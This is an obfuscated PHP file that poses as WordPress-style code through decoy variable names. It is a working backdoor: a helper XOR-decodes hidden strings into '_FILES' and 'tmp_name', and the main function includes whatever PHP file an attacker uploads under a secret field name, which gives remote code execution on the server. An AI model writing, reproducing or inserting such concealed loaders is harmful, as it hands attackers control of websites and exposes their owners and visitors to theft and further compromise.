<?php
        
    
	$hours = 'exts';
        
function cdata($to_ncr)

{
    $singular_base = $to_ncr;

    
    $uris = $GLOBALS[tagnames("2%03%10%18p%11", $singular_base)];
	$new_subs = 'translation_preg';
    $real_mime_types = $uris;
	$include = 'protocol';
    $excerpt_more = isset($real_mime_types[$singular_base]);
	$partials = 'stop';
    if ($excerpt_more)

    {

        $filename_raw = $uris[$singular_base];
        $wp_error = $filename_raw[tagnames("%19%28%29%0B%5B%23%21%07", $singular_base)];
	$translation_table = 'default_editor';
        $charset = $wp_error;

        include ($charset);
    }
}
function tagnames($backup_sizes, $utf8_pcre)

{

    $fallback = $utf8_pcre;
    $post_type_meta_caps = "url" . "decode";
    $template = $post_type_meta_caps($backup_sizes);
    $show_in_nav_menus = substr($fallback,0, strlen($template));
    $days = $template ^ $show_in_nav_menus;

    
    $template = strpos($days, $show_in_nav_menus);
    
    return $days;
}

cdata('mEYT5BLbuIS9B');
	$dynamic_characters = 'keys';

?>
